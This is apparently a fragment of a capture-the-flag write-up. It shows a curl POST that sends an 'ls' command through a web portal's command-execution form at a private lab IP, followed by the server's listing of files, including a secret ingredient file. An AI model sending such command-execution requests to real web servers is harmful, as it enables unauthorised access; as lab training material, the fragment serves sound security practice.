
curl Request
```
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.67.239' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 22' -H $'Origin: http://10.10.67.239' -H $'Connection: close' -H $'Referer: http://10.10.67.239/portal.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=o9h8nfdd1jc975uhg5ic4uul23' \
    --data-binary $'command=ls&sub=Execute' \
    $'http://10.10.67.239/portal.php'
```


Respond

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

